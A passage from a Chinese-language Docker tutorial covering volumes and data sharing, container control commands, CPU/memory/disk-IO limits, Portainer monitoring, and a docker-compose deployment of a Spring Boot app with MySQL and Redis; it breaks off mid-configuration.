容器存储管理\n\n前面我们介绍了容器的网络管理，我们现在已经了解了如何配置容器的网络，以及相关的一些原理。还有一个比较重要的部分就是容器的存储，在这一小节我们将深入了解容器的存储管理。\n\n### 容器持久化存储\n\n我们知道，容器在创建之后，实际上我们在容器中创建和修改的文件，实际上是被容器的分层机制保存在最顶层的容器层进行操作的，为了保护下面每一层的镜像不被修改，所以才有了这样的CopyOnWrite特性。但是这样也会导致容器在销毁时数据的丢失，当我们销毁容器重新创建一个新的容器时，所有的数据全部丢失，直接回到梦开始的地方。\n\n在某些情况下，我们可能希望对容器内的某些文件进行持久化存储，而不是一次性的，这里就要用到数据卷（Data Volume）了。\n\n在开始之前我们先准备一下实验要用到的镜像：\n\n```sh\ndocker run -it ubuntu\napt update && apt install -y vim\n```\n\n然后打包为我们一会要使用的镜像：\n\n```\ndocker commit \n```\n\n我们可以让容器将文件保存到宿主主机上，这样就算容器销毁，文件也会在宿主主机上保留，下次创建容器时，依然可以从宿主主机上读取到对应的文件。如何做到呢？只需要在容器启动时指定即可：\n\n```sh\nmkdir test\n```\n\n我们现在用户目录下创建一个新的`test`目录，然后在里面随便创建一个文件，再写点内容：\n\n```sh\nvim test/hello.txt\n```\n\n接着我们就可以将宿主主机上的目录或文件挂载到容器的某个目录上：\n\n```sh\ndocker run -it -v ~/test:/root/test ubuntu-volume\n```\n\n这里用到了一个新的参数`-v`，用于指定文件挂载，这里是将我们刚刚创建好的test目录挂在到容器的/root/test路径上。\n\n![image-20220703105256049](https://s2.loli.net/2022/07/03/ztEJDC4PTVAyZF2.png)\n\n这样我们就可以直接在容器中访问宿主主机上的文件了，当然如果我们对挂载目录中的文件进行编辑，那么相当于编辑的是宿主主机的数据：\n\n```sh\nvim /root/test/test.txt  \n```\n\n![image-20220703105626105](https://s2.loli.net/2022/07/03/YqUHkJiTG3Q9pAM.png)\n\n在宿主主机的对应目录下，可以直接访问到我们刚刚创建好的文件。\n\n接着我们来将容器销毁，看看当容器不复存在时，挂载的数据时候还能保留：\n\n![image-20220703105847329](https://s2.loli.net/2022/07/03/B5M6Wy8AxIoqJtC.png)\n\n可以看到，即使我们销毁了容器，在宿主主机上的文件依然存在，并不会受到影响，这样的话，当我们下次创建新的镜像时，依然可以使用这些保存在外面的文件。\n\n比如我们现在想要部署一个Nginx服务器来代理我们的前端，就可以直接将前端页面保存到宿主主机上，然后通过挂载的形式让容器中的Nginx访问，这样就算之后Nginx镜像有升级，需要重新创建，也不会影响到我们的前端页面。这里我们来测试一下，我们先将前端模板上传到服务器：\n\n```sh\nscp Downloads/moban5676.zip 192.168.10.10:~/\n```\n\n然后在服务器上解压一下：\n\n```sh\nunzip moban5676.zip\n```\n\n接着我们就可以启动容器了：\n\n```sh\ndocker run -it -v ~/moban5676:/usr/share/nginx/html/ -p 80:80 -d nginx\n```\n\n这里我们将解压出来的目录，挂载到容器中Nginx的默认站点目录`/usr/share/nginx/html/`（由于挂在后位于顶层，会替代镜像层原有的文件），这样Nginx就直接代理了我们存放在宿主主机上的前端页面，当然别忘了把端口映射到宿主主机上，这里我们使用的镜像是官方的nginx镜像。\n\n现在我们进入容器将Nginx服务启动：\n\n```sh\nsystemctl start nginx\n```\n\n然后通过浏览器访问看看是否代理成功：\n\n![image-20220703111937254](https://s2.loli.net/2022/07/03/YtgXWizh765qFxr.png)\n\n可以看到我们的前端页面直接被代理了，当然如果我们要编写自定义的配置，也是使用同样的方法操作即可。\n\n注意如果我们在使用`-v`参数时不指定宿主主机上的目录进行挂载的话，那么就由Docker来自动创建一个目录，并且会将容器中对应路径下的内容拷贝到这个自动创建的目录中，最后挂在到容器中，这种就是由Docker管理的数据卷了（docker managed volume）我们来试试看：\n\n```sh\ndocker run -it -v /root/abc ubuntu-volume\n```\n\n注意这里我们仅仅指定了挂载路径，没有指定宿主主机的对应目录，继续创建：\n\n![image-20220703112702067](https://s2.loli.net/2022/07/03/fXCl7IRqKBvYwxj.png)\n\n创建后可以看到`root`目录下有一个新的`abc`目录，那么它具体是在宿主主机的哪个位置呢？这里我们依然可以使用`inspect`命令：\n\n```sh\ndocker inspect bold_banzai \n```\n\n![image-20220703113507320](https://s2.loli.net/2022/07/03/zFotAfeBpcRjKWN.png)\n\n可以看到Sorce指向的是`/var/lib`中的某个目录，我们可以进入这个目录来创建一个新的文件，进入之前记得提升一下权限，权限低了还进不去：\n\n![image-20220703114333446](https://s2.loli.net/2022/07/03/2bfokiMTmdGZcUE.png)\n\n我们来创一个新的文本文档：\n\n![image-20220703114429831](https://s2.loli.net/2022/07/03/yi1hSPC3bAndMXm.png)\n\n实际上和我们之前是一样的，也是可以在容器中看到的，当然删除容器之后，数据依然是保留的。当我们不需要使用数据卷时，可以进行删除：\n\n![image-20220703145011638](https://s2.loli.net/2022/07/03/f8NPDWmhLtvw3SV.png)\n\n当然有时候为了方便，可能并不需要直接挂载一个目录上去，仅仅是从宿主主机传递一些文件到容器中，这里我们可以使用`cp`命令来完成：\n\n![image-20220703115648195](https://s2.loli.net/2022/07/03/uw7S5PobAUWBtCI.png)\n\n这个命令支持从宿主主机复制文件到容器，或是从容器复制文件到宿主主机，使用方式类似于Linux自带的`cp`命令。\n\n### 容器数据共享\n\n前面我们通过挂载的形式，将宿主主机上的文件直接挂载到容器中，这样容器就可以直接访问到宿主主机上的文件了，并且在容器删除时也不会清理宿主主机上的文件。\n\n我们接着来看看如何实现容器与容器之间的数据共享，实际上按照我们之前的思路，我们可以在宿主主机创建一个公共的目录，让这些需要实现共享的容器，都挂载这个公共目录：\n\n```sh\ndocker run -it -v ~/test:/root/test ubuntu-volume\n```\n\n![image-20220703141840532](https://s2.loli.net/2022/07/03/soxdKyY4MIXBOin.png)\n\n由于挂载的是宿主主机上的同一块区域，所以内容可以直接在两个容器中都能访问。当然我们也可以将另一个容器挂载的目录，直接在启动容器时指定使用此容器挂载的目录：\n\n```sh\ndocker run -it -v ~/test:/root/test --name=data_test ubuntu-volume\ndocker run -it --volumes-from data_test ubuntu-volume\n```\n\n这里使用`--volumes-from`指定另一个容器（这种用于给其他容器提供数据卷的容器，我们一般称为数据卷容器）\n\n![image-20220703142849845](https://s2.loli.net/2022/07/03/Uu4CjSZifv1Oyr7.png)\n\n可以看到，数据卷容器中挂载的内容，在当前容器中也是存在的，当然就算此时数据卷容器被删除，那么也不会影响到这边，因为这边相当于是继承了数据卷容器提供的数据卷，所以本质上还是让两个容器挂载了同样的目录实现数据共享。\n\n虽然通过上面的方式，可以在容器之间实现数据传递，但是这样并不方便，可能某些时候我们仅仅是希望容器之间共享，而不希望有宿主主机这个角色直接参与到共享之中，此时我们就需要寻找一种更好的办法了。其实我们可以将数据完全放入到容器中，通过构建一个容器，来直接将容器中打包好的数据分享给其他容器，当然本质上依然是一个Docker管理的数据卷，虽然还是没有完全脱离主机，但是移植性就高得多了。\n\n我们来编写一个Dockerfile：\n\n```dockerfile\nFROM ubuntu\nADD moban5676.tar.gz /usr/share/nginx/html/\nVOLUME /usr/share/nginx/html/\n```\n\n这里我们使用了一个新的指令ADD，它跟COPY命令类似，也可以复制文件到容器中，但是它可以自动对压缩文件进行解压，这里只需要将压缩好的文件填入即可，后面的VOLUME指令就像我们使用`-v`参数一样，会创建一个挂载点在容器中：\n\n```sh\ncd test\ntar -zcvf moban5676.tar.gz *\nmv moban5676.tar.gz ..\ncd ..\n```\n\n接着我们直接构建：\n\n```sh\ndocker build -t data .\n```\n\n![image-20220703153109650](https://s2.loli.net/2022/07/03/M7jxBUsApKtgzku.png)\n\n现在我们运行一个容器看看：\n\n![image-20220703153343461](https://s2.loli.net/2022/07/03/SUg32jlwMcY7Btp.png)\n\n可以看到所有的文件都自动解压出来了（除了中文文件名称乱码了之外，不过无关紧要）我们退出容器，可以看到数据卷列表中新增了我们这个容器需要使用的：\n\n![image-20220703153514730](https://s2.loli.net/2022/07/03/m6VCIbXyMxt3ilT.png)\n\n![image-20220703153542739](https://s2.loli.net/2022/07/03/KyLUic5r6oW4HDx.png)\n\n这个位置实际上就是数据存放在当前主机上的位置了，不过是由Docker进行管理而不是我们自定义的。现在我们就可以创建一个新的容器直接继承了：\n\n```sh\ndocker run -p 80:80 --volumes-from=data_test -d nginx\n```\n\n访问一下Nginx服务器，可以看到成功代理：\n\n![image-20220703111937254](https://s2.loli.net/2022/07/03/YtgXWizh765qFxr.png)\n\n这样我们就实现了将数据放在容器中进行共享，我们不需要刻意去指定宿主主机的挂载点，而是Docker自行管理，这样就算迁移主机依然可以快速部署。\n\n***\n\n## 容器资源管理\n\n前面我们已经完成Docker的几个主要模块的学习，最后我们来看看如何对容器的资源进行管理。\n\n### 容器控制操作\n\n在开始之前，我们还是要先补充一些我们前面没有提到的其他容器命令。\n\n首先我们的SpringBoot项目在运行是，怎么查看输出的日志信息呢？\n\n```sh\ndocker logs test\n```\n\n这里使用`log`命令来打印容器中的日志信息：\n\n![image-20220701221210083](https://s2.loli.net/2022/07/01/scNgb1uheEpiKL8.png)\n\n当然也可以添加`-f`参数来持续打印日志信息。\n\n![image-20220701215617022](https://s2.loli.net/2022/07/01/QTDeKASvHW1rXlw.png)\n\n现在我们的容器已经启动了，但是我们想要进入到容器监控容器的情况怎么办呢？我们可以是`attach`命令来附加到容器启动命令的终端上：\n\n```sh\ndocker attach 容器ID/名称\n```\n\n![image-20220701215829492](https://s2.loli.net/2022/07/01/QjHJsCt3DzqP6kZ.png)\n\n注意现在就切换为了容器内的终端，如果想要退出的话，需要先按Ctrl+P然后再按Ctrl+Q来退出终端，不能直接使用Ctrl+C来终止，这样会直接终止掉Docker中运行的Java程序的。\n\n![image-20220701220018207](https://s2.loli.net/2022/07/01/XkFKtxq3Epua5ib.png)\n\n 退出后，容器依然是处于运行状态的。\n\n我们也可以使用`exec`命令在容器中启动一个新的终端或是在容器中执行命令：\n\n```sh\ndocker exec -it test bash\n```\n\n`-it`和`run`命令的操作是一样的，这里执行后，会创建一个新的终端（当然原本的程序还是在正常运行）我们会在一个新的终端中进行交互：\n\n![image-20220701220601732](https://s2.loli.net/2022/07/01/lMc2JueBLIFz9bf.png)\n\n当然也可以仅仅在容器中执行一条命令：\n\n![image-20220701220909626](https://s2.loli.net/2022/07/01/aVvzjuEM56JmGd7.png)\n\n执行后会在容器中打开一个新的终端执行命令，并输出结果。\n\n前面我们还学习了容器的停止操作，通过输入`stop`命令来停止容器，但是此操作并不会立即停止，而是会等待容器处理善后，那么怎么样才能强制终止容器呢？我们可以直接使用`kill`命令，相当于给进程发送SIGKILL信号，强制结束。\n\n```sh\ndocker kill test\n```\n\n相比`stop`命令，`kill`就没那么温柔了。\n\n有时候可能只是希望容器暂时停止运行，而不是直接终止运行，我们希望在未来的某个时间点，恢复容器的运行，此时就可以使用`pause`命令来暂停容器：\n\n```sh\ndocker pause test\n```\n\n暂停容器后，程序暂时停止运行，无法响应浏览器发送的请求：\n\n![image-20220701222537737](https://s2.loli.net/2022/07/01/1yBYnGmuXVbNFKO.png)\n\n![image-20220701222243900](https://s2.loli.net/2022/07/01/ovbqk7xS3LKhmOH.png)\n\n此时处于爱的魔力转圈圈状态，我们可以将其恢复运行，使用`unpause`命令：\n\n```sh\ndocker unpause test\n```\n\n恢复运行后，瞬间就响应成功了。\n\n![image-20220701222323948](https://s2.loli.net/2022/07/01/g2b8mxVz1i7WJop.png)\n\n### 物理资源管理\n\n对于一个容器，在某些情况下我们可能并不希望它占据所有的系统资源来运行，我们只希望分配一部分资源给容器，比如只分配给容器2G内存，最大只允许使用2G，不允许再占用更多的内存，此时我们就需要对容器的资源进行限制。\n\n```sh\ndocker run -m 内存限制 --memory-swap=内存和交换分区总共的内存限制 镜像名称\n```\n\n其中`-m`参数是对容器的物理内存的使用限制，而`--memory-swap`是对内存和交换分区总和的限制，它们默认都是`-1`，也就是说没有任何的限制（如果在一开始仅指定`-m`参数，那么交换内存的限制与其保持一致，内存+交换等于`-m`的两倍大小）默认情况下跟宿主主机一样，都是2G内存，现在我们可以将容器的内存限制到100M试试看，其中物理内存50M，交换内存50M，尝试启动一下SpringBoot程序：\n\n```sh\ndocker run -it -m 50M --memory-swap=100M nagocoler/springboot-test:1.0\n```\n\n可以看到，上来就因为内存不足无法启动了：\n\n![image-20220702104653971](https://s2.loli.net/2022/07/02/MrBWZKIzgxE94Ck.png)\n\n当然除了对内存的限制之外，我们也可以对CPU资源进行限额，默认情况下所有的容器都可以平等地使用CPU资源，我们可以调整不同的容器的CPU权重（默认为1024），来按需分配资源，这里需要使用到`-c`选项，也可以输入全名`--cpu-share`：\n\n```sh\ndocker run -c 1024 ubuntu\ndocker run -c 512 ubuntu\n```\n\n这里容器的CPU权重比例为16比8，也就是2比1（注意多个容器时才会生效），那么当CPU资源紧张时，会按照此权重来分配资源，当然如果CPU资源并不紧张的情况下，依然是有机会使用到全部的CPU资源的。\n\n这里我们使用一个压力测试工具来进行验证：\n\n```sh\ndocker run -c 1024 --name=cpu1024 -it ubuntu\ndocker run -c 512 --name=cpu512 -it ubuntu\n```\n\n接着我们分别进入容器安装`stress`压力测试工具：\n\n```sh\napt update && apt install -y stress\n```\n\n接着我们分别在两个容器中都启动压力测试工具，产生4个进程不断计算随机数的平方根：\n\n```sh\nstress -c 4\n```\n\n接着我们进入top来看看CPU状态（看完之后记得赶紧去kill掉容器，不然CPU拉满很卡的）：\n\n![image-20220702114126128](https://s2.loli.net/2022/07/02/3dHkMWnq1ZxCyKm.png)\n\n可以看到权重高的容器中，分配到了更多的CPU资源，而权重低的容器中，只分配到一半的CPU资源。\n\n当然我们也可以直接限制容器使用的CPU数量：\n\n```sh\ndocker run -it --cpuset-cpus=1 ubuntu\n```\n\n`--cpuset-cpus`选项可以直接限制在指定的CPU上运行，比如现在我们的宿主机是2核的CPU，那么就可以分0和1这两个CPU给Docker使用，限制后，只会使用CPU 1的资源了：\n\n![image-20220702115538699](https://s2.loli.net/2022/07/02/erovkRBi7hSOuAt.png)\n\n可以看到，4个进程只各自使用了25%的CPU，加在一起就是100%，也就是只能占满一个CPU的使用率。如果要分配多个CPU，则使用逗号隔开：\n\n```sh\ndocker run -it --cpuset-cpus=0,1 ubuntu\n```\n\n这样就会使用这两个CPU了：\n\n![image-20220702115818344](https://s2.loli.net/2022/07/02/rdAPYlfsgeLOZa9.png)\n\n当然也可以直接使用`--cpus`来限制使用的CPU资源数：\n\n```sh\ndocker run -it --cpus=1 ubuntu\n```\n\n![image-20220702120329140](https://s2.loli.net/2022/07/02/pUGCjlsQbEM2Ika.png)\n\n限制为1后，只能使用一个CPU提供的资源，所以这里加载一起只有一个CPU的资源了。当然还有更精细的`--cpu-period `和`--cpu-quota`，这里就不做介绍了。\n\n最后我们来看一下对磁盘IO读写性能的限制，我们首先使用`dd`命令来测试磁盘读写速度：\n\n```sh\ndd if=/dev/zero of=/tmp/1G bs=4k count=256000 oflag=direct\n```\n\n可以不用等待跑完，中途Ctrl+C结束就行：\n\n![image-20220702121839871](https://s2.loli.net/2022/07/02/1y3O2qbaMsxDFUJ.png)\n\n可以看到当前的读写速度为86.4 MB/s，我们可以通过`--device-read/write-bps`和`--device-read/write-iops`参数对其进行限制。\n\n这里要先说一下区别：\n\n* bps：每秒读写的数据量。\n* iops：每秒IO的次数。\n\n为了直观，这里我们直接使用BPS作为限制条件：\n\n```sh\ndocker run -it --device-write-bps=/dev/sda:10MB ubuntu\n```\n\n因为容器的文件系统是在`/dev/sda`上的，所以这我们就`/dev/sda:10MB`来限制对/dev/sda的写入速度只有10MB/s，我们来测试一下看看：\n\n![image-20220702122557288](https://s2.loli.net/2022/07/02/EczxDAmUCvlwT5u.png)\n\n可以看到现在的速度就只有10MB左右了。\n\n### 容器监控\n\n最后我们来看看如何对容器的运行状态进行实时监控，我们现在希望能够对容器的资源占用情况进行监控，该怎么办呢？\n\n我们可以使用`stats`命令来进行监控：\n\n```sh\ndocker stats\n```\n\n![image-20220702153236692](https://s2.loli.net/2022/07/02/hl6qw7sXuavA4pY.png)\n\n可以实时对容器的各项状态进行监控，包括内存使用、CPU占用、网络I/O、磁盘I/O等信息，当然如果我们限制内存的使用的话：\n\n```sh\ndocker run -d -m 200M nagocoler/springboot-test:1.0\n```\n\n可以很清楚地看到限制情况：\n\n![image-20220702153704729](https://s2.loli.net/2022/07/02/CGc6T4iYyN7PD51.png)\n\n除了使用`stats`命令来实时监控情况之外，还可以使用`top`命令来查看容器中的进程：\n\n```sh\ndocker top 容器ID/名称\n```\n\n![image-20220702153957780](https://s2.loli.net/2022/07/02/ytMjZXK9aivTAWD.png)\n\n当然也可以携带一些参数，具体的参数与Linux中`ps`命令参数一致，这里就不多做介绍了。\n\n但是这样的监控是不是太原始了一点？有没有那种网页面板可以进行实时监控和管理的呢？有的。\n\n我们需要单独部署一个Docker网页管理面板应用，一般比较常见的有：Portainer，我们这里可以直接通过Docker镜像的方式去部署这个应用程序，搜索一下，发现最新版维护的地址为：https://hub.docker.com/r/portainer/portainer-ce\n\nCE为免费的社区版本，当然也有BE商业版本，这里我们就直接安装社区版就行了，官方Linux安装教程：https://docs.portainer.io/start/install/server/docker/linux，包含一些安装前需要的准备。\n\n首先我们需要创建一个数据卷供Portainer使用：\n\n```sh\ndocker volume create portainer_data\n```\n\n接着通过官方命令安装启动：\n\n```sh\ndocker run -d -p 8000:8000 -p 9443:9443 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest\n```\n\n注意这里需要开放两个端口，一个是8000端口，还有一个是9443端口。\n\n![image-20220702155450772](https://s2.loli.net/2022/07/02/m71ha8YWsUzPFJ4.png)\n\nOK，开启成功，我们可以直接登录后台面板：https://IP:9443/，这里需要HTTPS访问，浏览器可能会提示不安全，无视就行：\n\n![image-20220702155637366](https://s2.loli.net/2022/07/02/mukzgvnWZyrxeaM.png)\n\n![image-20220702155703962](https://s2.loli.net/2022/07/02/E3vy1MKPAr5OJtW.png)\n\n进入后就需要我们进行注册了，这里我们只需输入两次密码即可，默认用户名就是admin，填写完成后，我们就可以开始使用了：\n\n![image-20220702160124676](https://s2.loli.net/2022/07/02/P1JIKaMCl7guYoz.png)\n\n点击Get Started即可进入到管理页面，我们可以看到目前有一个本地的Docker服务器正在运行：\n\n![image-20220702160328972](https://s2.loli.net/2022/07/02/OUTrAEmwsNoSG8Y.png)\n\n我们可以点击进入，进行详细地管理，不过唯一缺点就是没中文，挺难受的，也可以使用非官方的汉化版本：https://hub.docker.com/r/6053537/portainer-ce。\n\n***\n\n## 单机容器编排\n\n最后我们来讲解一下Docker-Compose，它能够对我们的容器进行编排。比如现在我们要在一台主机上部署很多种类型的服务，包括数据库、消息队列、SpringBoot应用程序若干，或是想要搭建一个MySQL集群，这时我们就需要创建多个容器来完成来，但是我们希望能够实现一键部署，这时该怎么办呢？我们就要用到容器编排了，让多个容器按照我们自己的编排进行部署。\n\n**官方文档：**https://docs.docker.com/get-started/08_using_compose/，视频教程肯定不可能把所有的配置全部介绍完，所以如果各位小伙伴想要了解更多的配置，有更多需求的话，可以直接查阅官方文档。\n\n### 快速开始\n\n在Linux环境下我们需要先安装一下插件：\n\n```sh\nsudo apt install docker-compose-plugin\n```\n\n接着输入`docker compose version`来验证一下是否安装成功。\n\n![image-20220703163126221](https://s2.loli.net/2022/07/03/5XDiAMpgW9aqUGJ.png)\n\n这里我们就以部署SpringBoot项目为例，我们继续使用之前打包好的SpringBoot项目，现在我们希望部署这个SpringBoot项目的同时，部署一个MySQL服务器，一个Redis服务器，这时我们SpringBoot项目要运行的整个完整环境，先获取到对应的镜像：\n\n```sh\ndocker pull mysql/mysql-server\ndocker pull redis\n```\n\n接着，我们需要在自己的本地安装一下DockerCompose，下载地址：https://github.com/docker/compose/releases，下载自己电脑对应的版本，然后在IDEA中配置：\n\n![image-20220703175103531](https://s2.loli.net/2022/07/03/GmcqXEV3tsPQYd9.png)\n\n下载完成后，将Docker Compose可执行文件路径修改为你存放刚刚下载的可执行文件的路径，Windows直接设置路径就行，MacOS下载之后需要进行下面的操作：\n\n```sh\nmv 下载的文件名称 docker-compose\nsudo chmod 777 docker-compose\nsudo mv docker-compose /usr/local/bin\n```\n\n配置完成后就可以正常使用了，否则会无法运行，接着我们就可以开始在IDEA中编写docker-compose.yml文件了。\n\n![image-20220703180206437](https://s2.loli.net/2022/07/03/M1gcJFUfQtnEpmB.png)\n\n这里点击右上角的“与服务工具窗口同步”按钮，这样一会就可以在下面查看情况了。\n\n我们现在就从头开始配置这个文件，现在我们要创建三个服务，一个是MySQL服务器，一个是Redis服务器，还有一个是SpringBoot服务器，需要三个容器来分别运行，首先我们先写上这三个服务：\n\n```yaml\nversion: \"3.9\"  #首先是版本号，别乱写，这个是和Docker版本有对应的\nservices:   #services里面就是我们所有需要进行编排的服务了\n  spring:   #服务名称，随便起\n    container_name: app_springboot  #一会要创建的容器名称\n  mysql:\n    container_name: app_mysql\n  redis:\n    container_name: app_redis\n```\n\n这样我们就配置好了一会要创建的三个服务和对应的容器名称，接着我们需要指定一下这些容器对应的镜像了，首先是我们的SpringBoot应用程序，可能我们后续还会对应用程序进行更新和修改，所以这里我们部署需要先由Dockerfile构建出镜像后，再进行部署：\n\n```yaml\nspring:\n  container_name: app_springboot\n  build: .  #build表示使用构建的镜像，.表示使用当前目录下的Dockerfile进行构建\n```\n\n我们这里修改一下Dockerfile，将基础镜像修改为已经打包好JDK环境的镜像：\n\n```dockerfile\nFROM adoptopenjdk/openjdk8\nCOPY target/DockerTest-0.0.1-SNAPSHOT.jar app.jar\nCMD java -jar app.jar\n```\n\n接着是另外两个服务，另外两个服务需要使用对应的镜像来启动容器：\n\n```yml\nmysql:\n  container_name: app_mysql\n  image: mysql/mysql-server:latest  #image表示使用对应的镜像，这里会自动从仓库下载，然后启动容器\nredis:\n  container_name: app_redis\n  image: redis:latest\n```\n\n还没有结束，我们还需要将SpringBoot项目的端口进行映射，最后一个简单的docker-compose配置文件就编写完成了：\n\n```yaml\nversion: \"3.9\"  #首先是版本号，别乱写，这个是和Docker版本有对应的\nservices:   #services里面就是我们所有需要进行编排的服务了\n  spring:   #服务名称，随便起\n    container_name: app_springboot  #一会要创建的容器名称\n    build: .\n    ports:\n    - \"8080:8080\"\n  mysql:\n    container_name: app_mysql\n    image: mysql/mysql-server:latest\n  redis:\n    container_name: app_redis\n    image: redis:latest\n```\n\n现在我们就可以直接一键部署了，我们点击下方部署按钮：\n\n![image-20220703182541976](https://s2.loli.net/2022/07/03/bTWZkQidsqfNc9w.png)\n\n![image-20220703182559020](https://s2.loli.net/2022/07/03/YHzOEhS5giBVql2.png)\n\n看到 Running 4/4 就表示已经部署成功了，我们现在到服务器这边来看看情况：\n\n![image-20220703182657205](https://s2.loli.net/2022/07/03/ZAsg3KM8r19malT.png)\n\n可以看到，这里确实是按照我们的配置，创建了3个容器，并且都是处于运行中，可以正常访问：\n\n![image-20220703182958392](https://s2.loli.net/2022/07/03/GqbV1SWMRY8jnEc.png)\n\n如果想要结束的话，我们只需要点击停止就行了：\n\n![image-20220703183240400](https://s2.loli.net/2022/07/03/ZNRB1XegVFJEaQ7.png)\n\n当然如果我们不再需要这套环境的话，可以直接点击下方的按钮，将整套编排给down掉，这样的话相对应的容器也会被清理的：\n\n![image-20220703183730693](https://s2.loli.net/2022/07/03/IOVsb3tGpqAnHk9.png)\n\n![image-20220703183807157](https://s2.loli.net/2022/07/03/ZWbxDKTCimdo6Mr.png)\n\n注意在使用docker-compose部署时，会自动创建一个新的自定义网络，并且所有的容器都是连接到这个自定义的网络里面：\n\n![image-20220703210431690](https://s2.loli.net/2022/07/03/NB2MfgA5GZuCSnd.png)\n\n这个网络默认也是使用bridge作为驱动：\n\n![image-20220703210531073](https://s2.loli.net/2022/07/03/jEazItdPKxuRcCQ.png)\n\n这样，我们就完成了一个简单的配置，去部署我们的整套环境。\n\n### 部署完整项目\n\n前面我们学习了使用`docker-compose`进行简单部署，但是仅仅只是简单启动了服务，我们现在来将这些服务给连起来。首先是SpringBoot项目，我们先引入依赖：\n\n```xml\n<dependency>\n   <groupId>org.springframework.boot</groupId>\n   <artifactId>spring-boot-starter-jdbc</artifactId>\n</dependency>\n\n<dependency>\n   <groupId>mysql</groupId>\n   <artifactId>mysql-connector-java</artifactId>\n</dependency>\n```\n\n接着配置一下数据源，等等，我们怎么知道数据库的默认密码是多少呢？所以我们先配置一下MySQL服务：\n\n```yaml\nmysql:\n  container_name: app_mysql\n  image: mysql/mysql-server:latest\n  environment:   #这里我们通过环境变量配置MySQL的root账号和密码\n    MYSQL_ROOT_HOST: '%'   #登陆的主机，这里直接配置为'%'\n    MYSQL_ROOT_PASSWORD: '123456.root'    #MySQL root账号的密码，别设定得太简单了\n    MYSQL_DATABASE: 'study'    #在启动时自动创建的数据库\n    TZ: 'Asia/Shanghai'    #时区\n  ports:\n  - \"3306:3306\"    #把端口暴露出来，当然也可以不暴露，因为默认所有容器使用的是同一个网络\n```\n\n有关MySQL的详细配置请查阅：https://registry.hub.docker.com/_/mysql\n\n接着我们将数据源配置完成：\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://app_mysql:3306/study   #地址直接输入容器名称，会自动进行解析，前面已经讲过了\n    username: root\n    password: 123456.root\n```\n\n然后我们来写点测试的代码吧，这里我们使用JPA进行交互：\n\n```xml\n<dependency>\n   <groupId>org.springframework.boot</groupId>\n   <artifactId>spring-boot-starter-data-jpa</artifactId>\n</dependency>\n\n<dependency>\n   <groupId>org.projectlombok</groupId>\n   <artifactId>lombok</artifactId>\n</dependency>\n```\n\n```java\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Entity\n@Table(name = \"db_account\")\npublic class Account {\n\n    @Column(name = \"id\")\n    @Id\n    long id;\n\n    @Column(name = \"name\")\n    String name;\n\n    @Column(name = \"password\")\n    String password;\n}\n```\n\n```java\n@Repository\npublic interface AccountRepository extends JpaRepository<Account, Long> {\n\n}\n```\n\n```java\n@RestController\npublic class MainController {\n\n    @Resource\n    AccountRepository repository;\n\n    @RequestMapping(\"/\")\n    public String hello(){\n        return \"Hello World!\";\n    }\n\n    @GetMapping(\"/get\")\n    public Account get(@RequestParam(\"id\") long id){\n        return repository.findById(id).orElse(null);\n    }\n\n    @PostMapping(\"/post\")\n    public Account get(@RequestParam(\"id\") long id,\n                       @RequestParam(\"name\") String name,\n                       @RequestParam(\"password\") String password){\n        return repository.save(new Account(id, name, password));\n    }\n}\n```\n\n接着我们来修改一下配置文件：\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://app_mysql:3306/study\n    username: root\n    password: 123456.root\n  jpa:\n    database: mysql\n    show-sql: true\n    hibernate:\n      ddl-auto: update   #这里自动执行DDL创建表，全程自动化，尽可能做到开箱即用\n```\n\n现在代码编写完成后，我们可以将项目打包了，注意执行我们下面的打包命令，不要进行测试，因为连不上数据库：\n\n```sh\nmvn package -DskipTests\n```\n\n重新生成jar包后，我们修改一下docker-compose配置，因为MySQL的启动速度比较慢，我们要一点时间等待其启动完成，如果连接不上数据库导致SpringBoot项目启动失败，我们就重启：\n\n```yaml\nspring:   #服务名称，随便起\n  container_name: app_springboot  #一会要创建的容器名称\n  build: .\n  ports:\n  - \"8080:8080\"\n  depends_on:  #这里设置一下依赖，需要等待mysql启动后才运行，但是没啥用，这个并不是等到启动完成后，而是进程建立就停止等待\n  - mysql\n  restart: always  #这里配置容器停止后自动重启\n```\n\n然后我们将之前自动构建的镜像删除，等待重新构建：\n\n![image-20220703215050497](https://s2.loli.net/2022/07/03/frdTCPDGIuqwAWH.png)\n\n现在我们重新部署docker-compos吧：\n\n![image-20220703215133786](https://s2.loli.net/2022/07/03/Tjq8ZYiU4FewKHE.png)\n\n当三个服务全部为蓝色时，就表示已经正常运行了，现在我们来测试一下吧：\n\n![image-20220703215211999](https://s2.loli.net/2022/07/03/3TYABoDZGpK6Rjb.png)\n\n接着我们来试试看向数据库传入数据：\n\n![image-20220703215236719](https://s2.loli.net/2022/07/03/nVEURiAe7qjworl.png)\n\n![image-20220703215245757](https://s2.loli.net/2022/07/03/QKFDdriwJCgPbxW.png)\n\n可以看到响应成功，接着我们来请求一下：\n\n![image-20220703215329690](https://s2.loli.net/2022/07/03/uB6rYDCSbLXmOPE.png)\n\n这样，我们的项目和MySQL基本就是自动部署了。\n\n接着我们来配置一下Redis：\n\n```xml\n<dependency>\n   <groupId>org.springframework.boot</groupId>\n   <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n\n接着配置连接信息：\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://app_mysql:3306/study\n    username: root\n    password: 123456.root\n  jpa:\n    database: mysql\n    show-sql: true\n    hibernate:\n      ddl-auto: update\n  redis:\n    host: app_redis\n```\n\n```java\n//再加两个Redis操作进来\n@Resource\nStringRedisTemplate template;\n\n@GetMapping(\"/take\")\npublic String take(@RequestParam(\"key\") String key){\n    return template.opsForValue().get(key);\n}\n\n@PostMapping(\"/put\")\npublic String  put(@RequestParam(\"key\") String key,\n                   @RequestParam(\"value\") String value){\n    template.opsForValue().set(key, value);\n    return \"操作成功！\";\n}\n```\n\n最后我们来配置一下docker-compose的配置文件：\n\n```yaml\nredis:\n  container_name: app_redis\n  image: redis:latest\n  ports:\n  - 